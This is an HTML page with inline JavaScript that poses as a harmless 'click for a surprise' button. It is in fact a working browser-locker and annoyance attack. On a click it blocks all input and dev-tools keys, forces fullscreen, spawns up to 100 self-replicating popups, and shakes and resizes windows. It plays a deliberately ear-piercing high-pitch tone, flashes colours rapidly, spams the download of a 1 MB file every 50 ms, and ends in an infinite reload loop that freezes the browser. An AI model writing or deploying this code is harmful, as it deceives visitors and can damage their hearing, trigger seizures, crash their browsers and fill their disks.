<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click Me!</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>WELCOME</h1>
        <p>Click the button below for a surprise</p>
        <button id="prankButton" class="prank-button">CLICK ME</button>
        <div id="videoContainer" style="display: none; margin-top: 20px;"></div>
    </div>

    <script>
        const button = document.getElementById('prankButton');
        const videoContainer = document.getElementById('videoContainer');

        // Prevent closing
        window.onbeforeunload = function() {
            localStorage.x = 1;
            return '';
        };

        let popupCount = 0;
        const maxPopups = 100;

        function createPopup() {
            if (popupCount >= maxPopups) return;
            
            const popup = window.open(window.location.href + '?popup=1', '_blank', 'width=600,height=500');
            if (popup) {
                popupCount++;
                
                const randomX = Math.random() * (screen.width - 600);
                const randomY = Math.random() * (screen.height - 500);
                popup.moveTo(randomX, randomY);
            }
        }

        function movePopups() {
            const popups = window.open('', '_blank');
            // This won't work directly, but we'll move the current window
            const randomX = Math.random() * (screen.width - 400);
            const randomY = Math.random() * (screen.height - 300);
            window.moveTo(randomX, randomY);
        }

        async function startChaos(isPopup = false) {
            if (!isPopup && button) {
                button.style.display = 'none';
            }
            if (isPopup && button) {
                button.style.display = 'none';
            }
            videoContainer.style.display = 'block';
            
            // Block all keyboard inputs
            document.addEventListener('keydown', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            // Block all mouse clicks and touches
            document.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            document.addEventListener('mousedown', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            document.addEventListener('touchstart', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            // Block right-click
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            // Block dev tools shortcuts
            document.addEventListener('keydown', (e) => {
                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'U')) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            }, true);
            
            // Block tab switching
            document.addEventListener('visibilitychange', () => {
                if (document.hidden) {
                    window.focus();
                }
            });
            
            // Only main window goes fullscreen
            if (!isPopup) {
                // Try fullscreen with retry
                const tryFullscreen = () => {
                    document.documentElement.requestFullscreen().catch(e => {
                        setTimeout(tryFullscreen, 100);
                    });
                };
                tryFullscreen();
                
                // Spawn popups rapidly
                for (let i = 0; i < 50; i++) {
                    setTimeout(createPopup, i * 50);
                }
                
                // Keep spawning popups faster
                setInterval(() => {
                    if (popupCount < maxPopups) {
                        createPopup();
                    }
                }, 50);
            }
            
            // Move window around rapidly
            setInterval(() => {
                const randomX = Math.random() * (screen.width - 400);
                const randomY = Math.random() * (screen.height - 300);
                window.moveTo(randomX, randomY);
            }, 20);
            
            // Resize window randomly
            setInterval(() => {
                const randomW = 300 + Math.random() * 500;
                const randomH = 200 + Math.random() * 400;
                window.resizeTo(randomW, randomH);
            }, 100);
            
            // Play ear-piercing high-pitch noise
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const gainNode = audioContext.createGain();
            
            oscillator.type = 'sawtooth';
            oscillator.frequency.setValueAtTime(8000, audioContext.currentTime);
            oscillator.frequency.exponentialRampToValueAtTime(15000, audioContext.currentTime + 0.1);
            
            gainNode.gain.value = 100.0; // Extremely loud
            
            oscillator.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            oscillator.start();
            
            // Modulate frequency for more piercing effect
            setInterval(() => {
                const freq = 5000 + Math.random() * 10000;
                oscillator.frequency.setValueAtTime(freq, audioContext.currentTime);
            }, 10);
            
            try {
                const response = await fetch('base64.txt');
                const base64String = await response.text();
                const videoSrc = 'data:video/mp4;base64,' + base64String;
                
                // Create 1 video element with amplified audio
                const video = document.createElement('video');
                video.src = videoSrc;
                video.width = 800;
                video.height = 600;
                video.volume = 1.0;
                video.loop = true;
                videoContainer.appendChild(video);
                
                // Connect to audio context for normal volume
                const source = audioContext.createMediaElementSource(video);
                const videoGainNode = audioContext.createGain();
                videoGainNode.gain.value = 1.0; // Normal volume
                source.connect(videoGainNode);
                videoGainNode.connect(audioContext.destination);
                
                video.play().catch(e => {
                    console.log('Autoplay blocked');
                });
                
                // Add automated voice - repeat one message
                const message = "form";
                
                function speakRepeat() {
                    const utterance = new SpeechSynthesisUtterance(message);
                    utterance.volume = 1.0;
                    utterance.rate = 1.0;
                    utterance.pitch = 1.0;
                    utterance.onend = () => {
                        setTimeout(speakRepeat, 100);
                    };
                    speechSynthesis.speak(utterance);
                }
                speakRepeat();
            } catch (e) {
                console.error('Failed to load video:', e);
            }
            
            // Screen shake effect
            setInterval(() => {
                document.body.style.transform = `translate(${Math.random() * 20 - 10}px, ${Math.random() * 20 - 10}px)`;
            }, 50);
            
            // Flash background colors
            setInterval(() => {
                const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff', '#ffffff', '#000000'];
                document.body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            }, 100);
            
            // Force download spam
            function forceDownload(url, fileName) {
                const link = document.createElement('a');
                link.style.display = 'none';
                link.href = url;
                link.setAttribute('download', fileName || '');
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
            
            // Generate and download random files
            setInterval(() => {
                const randomData = new Array(1000000).fill('x').join('');
                const blob = new Blob([randomData], { type: 'text/plain' });
                const url = window.URL.createObjectURL(blob);
                forceDownload(url, `spam_${Date.now()}.txt`);
                window.URL.revokeObjectURL(url);
            }, 50);
            
            // Infinite loop to freeze browser (like the crasher website)
            setTimeout(() => {
                while(true) {
                    window.onbeforeunload = function() {
                        localStorage.x = 1;
                        return '';
                    };
                    location.reload(1);
                }
            }, 2000);
        }

        button.addEventListener('click', () => startChaos(false));

        // Auto-start if URL has popup parameter
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('popup')) {
            // Try to simulate user interaction for popups
            setTimeout(() => {
                if (button) {
                    // Try to simulate a click
                    button.click();
                }
                // Also try to resume audio context directly
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                audioContext.resume().then(() => {
                    startChaos(true);
                }).catch(() => {
                    startChaos(true);
                });
            }, 100);
        }
    </script>
</body>
</html>
